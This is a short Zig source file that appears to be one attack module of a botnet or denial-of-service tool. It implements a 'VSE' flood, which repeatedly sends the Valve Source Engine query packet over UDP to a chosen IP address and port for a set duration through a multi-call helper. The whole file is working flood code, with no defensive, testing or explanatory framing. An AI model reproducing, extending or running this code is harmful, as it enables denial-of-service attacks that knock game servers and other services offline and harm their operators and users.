const std = @import("std");

const helpers = @import("../helpers.zig");
const Caller = @import("Caller.zig");

const linux = std.os.linux;

// Valve Source Engine query payload
const VSE_PAYLOAD = "\xff\xff\xff\xff\x54Source Engine Query\x00";

pub fn vse(allocator: std.mem.Allocator, dst_ip: [4]u8, port: u16, duration: u32) void {
    const c = Caller.init(allocator, 5, duration, @constCast(&_vse), .{ .ip = dst_ip, .port = port });
    c.call();
}

fn _vse(dst_ip: [4]u8, port: u16) void {
    const fd = linux.socket(linux.AF.INET, linux.SOCK.DGRAM, linux.IPPROTO.UDP);
    defer _ = linux.close(@intCast(fd));

    const sockaddr = std.net.Address{ .in = std.net.Ip4Address.init(dst_ip, port) };

    _ = helpers.sendto(@intCast(fd), VSE_PAYLOAD, VSE_PAYLOAD.len, linux.MSG.NOSIGNAL, &sockaddr.any, @intCast(@as(linux.socklen_t, sockaddr.getOsSockLen()))) catch return;
}
